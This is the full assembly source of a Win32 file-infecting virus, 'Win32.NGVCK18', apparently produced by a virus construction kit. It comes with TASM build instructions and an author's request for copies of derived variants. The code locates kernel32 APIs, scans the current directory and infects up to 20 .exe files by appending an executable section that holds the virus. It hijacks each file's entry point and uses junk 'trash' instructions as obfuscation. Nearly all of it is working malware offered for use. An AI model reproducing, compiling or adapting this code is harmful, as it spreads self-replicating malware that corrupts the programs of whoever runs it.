              
;
;
; Win32.NGVCK18 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK18
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 19
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 add esp, 4d
 mov ecx, dword ptr [esp-4]
                                        ; mov ebp, ecx
 push ecx
 pop ebp
 jmp KernelSearchStart


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 dec edx                                ; Trash
 pop eax

                                        ; load API Names and Offsets
 mov edx, offset APINames
 add edx, ebp

 lea esi, [ebp+APIOffsets]
 xor dword ptr [ebp+Trash1], ebx        ; Trash


GetApisLoop: 

 mov ecx, edx
APINameDetect:                          ; calculate the lenght of the names
 inc ecx
 cmp byte ptr [ecx], 0
 jne APINameDetect

 sub ecx, edx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; edx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add edx, ecx
                                        ; add edx, 1
 inc edx
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], ebx
                                        ; add esi, 4
 add esi, 4d
 sub eax, 1
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg edi, ecx

 push edi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea esi, [ebp+WFD_szFileName]

                                        ; mov ebx, 276
 mov ebx, ( 276d + 0d )
 sub ebx, 0d

ClearOldData2:
 mov byte ptr [esi], 0h
                                        ; add esi, 1
 add esi, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]

 push ebx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


 push dword ptr [ebp+NTableVA]
 pop ebx
 sub dword ptr [ebp+Trash1], 43045      ; Trash


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 inc dword ptr [ebp+Trash1]             ; Trash
 xor dword ptr [ebp+NTableTemp], ebx
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; mov ebx, eax
                                        ; clear ebx
 and ebx, 0
 add ebx, eax
                                        ; mov edi, ebx
 mov edi, ebx
 push ecx
 mov dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], edx
 adc eax, 44398676d                     ; Trash
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov al, byte ptr [edi]
 cmp al, byte ptr [edx]
 jne ApiNotFound
 dec ecx
 cmp ecx, 0
 je FoundApi1
                                        ; add edx, 1
 sub edx, -1d
                                        ; add edi, 1
 inc edi
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ecx
 push dword ptr [ebp+TempApisearch3]
 pop edx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+NTableTemp]
                                        ; clear edi
 mov edi, -36683d
 add edi, 36683d
 xor edi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear ebx
 mov ebx, 0
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov esi, ebx
 movzx ebx, word ptr [esi]
 and eax, ebx                           ; Trash
 sal ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebp+KernelMZ]
 sub dword ptr [ebp+Trash1], 1951040    ; Trash
 add eax, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], eax

 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], esi

 rcl eax, 6d                            ; Trash


ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 dec ebp
 add ebp, 1
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retEIP dd 0h
 add edx,12345678h
 org $-4
 retBase dd 0h
 jmp edx



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov dword ptr [ebp+Trash1], 1797758    ; Trash
                                        ; clear edx
 mov edx, -19535d
 add edx, 19535d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ebx, [edi+3Ch]
 add ebx, edi
                                        ; get File Alignment
 mov ecx, [ebx+3Ch]
 mov dword ptr [ebp+filealign], ecx
                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+MapAddress]
 sal ecx, 26d                           ; Trash
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
 rol edx, 1d                            ; Trash
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], 0
 add dword ptr [ebp+PEheader], ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov edx, dword ptr [ecx+28h]
 push edx
 pop dword ptr [ebp+OldEIP]
 mov edx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ebx, [ecx+74h]
 shl ebx, 3
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [ecx+6h]
 mov eax, 28h
 pushad
 mov eax, edx
 mul eax
 mov dword ptr [ebp+Misc1], -1
 and dword ptr [ebp+Misc1], eax
 popad
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, ebx
 add ecx, edx
 lea eax, [ebp+newsection]
 xchg eax, ebx


 xchg ebx, ecx
 push ebx
                                        ; Calculate the RVA of the new section
 mov ecx, [ebx-5*8+8d]
 add ecx, [ebx-5*8+12d]
 mov edx, dword ptr [ebp + offset sectionalign]
 push ecx
 pop dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+nsphysicalsize], 0
 xor dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear eax
 mov eax, -44836d
 add eax, 44836d
 xor eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 xor dword ptr [ebp+nsvirtualsize], eax
                                        ; calculate physical offset
 mov eax,[ebx-5*8+20d]
 add eax,[ebx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; mov ecx, -1
 mov ecx, -1d
 and ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
 push dword ptr [ebp+filealign]
 pop eax
 mov edx, ecx
 mov dword ptr [ebp+AlignReg2], eax
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], 0
 and ebx, 438707d                       ; Trash
 xor dword ptr [ebp+AlignReg1], edx
 call Align
                                        ; clear edx
 mov edx, -37053d
 add edx, 37053d
 add edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
                                        ; mov ebx, 16
 mov ebx, ( 16d xor 36d )
 xor ebx, 36d
 pop ecx
 lea edx, [ebp+newsection]
 xchg eax, edx

WriteNewSectionLoop:
 mov edx, dword ptr [eax]
 mov dword ptr [ecx], edx
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
                                        ; add eax, 4
 add eax, 4d
 dec ebx
 or ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+PEheader]
 add word ptr [ecx+06h], 1
                                        ; clear eax
 push 0
 pop eax
 add eax, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ecx+28h], eax
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], 0h
 add dword ptr [ecx+4Ch], 'NGVC'
                                        ; clear ecx
 push 0
 pop ecx
 xor ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 lea edx, [ebp+Virus]
 xchg edx, esi

 mov eax, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 pop eax
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, edx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, offset WFD_szFileName
 add eax, ebp


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz NoInfection
                                        ; check for minimum filesize
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 23d )
 xor ecx, 23d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 push dword ptr [ebp+WFD_nFileSizeHigh]
 pop ebx
 cmp ebx, 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; mov edx, 943
 mov edx, ( 943d xor 38d )
 xor edx, 38d
 cmp edx, 943d
 je Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
 mov edx, ebx                           ; Trash
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop ebx
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 mov eax, offset WFD_szFileName
 add eax, ebp

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea edx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax
 sub dword ptr [ebp+Trash1], eax        ; Trash

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx
 shr ebx, 7d                            ; Trash
 push 0
 push ecx
 push 0
                                        ; mov edx, 4
 mov edx, ( 4d xor 30d )
 xor edx, 30d
 push edx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
 test eax, eax
 jz CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 add edx, 33612985d                     ; Trash
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Misc1       dd 0h
 OldEIP      dd 0h
 InfCounter  dd 0h
 NewEIP      dd 0h
 filemask    db '*.exE',0
 TempApisearch2 dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XUnmapViewOfFile       dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h
 XSetFileAttributesA    dd 0h

 FindHandle  dd 0h
 filealign   dd 0h
 KernelPE    dd 0h
 db 'Win32.NGVCK18 - SnakeByte',0
 counter     dw 0h
 NTableVA    dd 0h

 TempApisearch3 dd 0h
 MapAddress  dd 0h
 Attributes  dd 0h
 PEheader    dd 0h
 OldBase     dd 400000h
 MapHandle   dd 0h
 OTableVA    dd 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 AlignReg1   dd 0h
 Trash1      dd 0h

 APINames:
 db 'MapViewOfFile', 0
 db 'UnmapViewOfFile', 0
 db 'GetFileAttributesA', 0
 db 'CreateFileA', 0
 db 'FindFirstFileA', 0
 db 'FindNextFileA', 0
 db 'FindClose', 0
 db 'CloseHandle', 0
 db 'CreateFileMappingA', 0
 db 'SetFileAttributesA', 0

 NewSize     dd 0h
 sectionalign   dd 0h
 FileHandle  dd 0h
 NTableTemp  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 AlignReg2   dd 0h
 TempAPI     dd 0h




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea eax, [ebp+filemask]
 xchg ebx, eax

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear ebx
 mov ebx, 58392d
 sub ebx, 58392d
 add ebx, dword ptr [ebp+InfCounter]
 test ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear ecx
 mov ecx, 0
 xor ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 add esp, -4d
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi


                                        ; round to pages
 mov dx, 0h
                                        ; add edx, 1
 inc edx
GetKernelLoop:
                                        ; clear eax
 sub eax, eax
 add edx, -1
 mov ax, word ptr [edx+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edx
 mov ebx, [edx+3Ch]
 add ebx, edx
 mov [KernelPE+ebp], ebx
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ecx, [esi+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 dec ecx
 add ecx, 29d
                                        ; get ATableVA
 mov esi, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [ecx]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; get OTableVA
 mov esi, dword ptr [ecx]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
 jmp GetApis

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

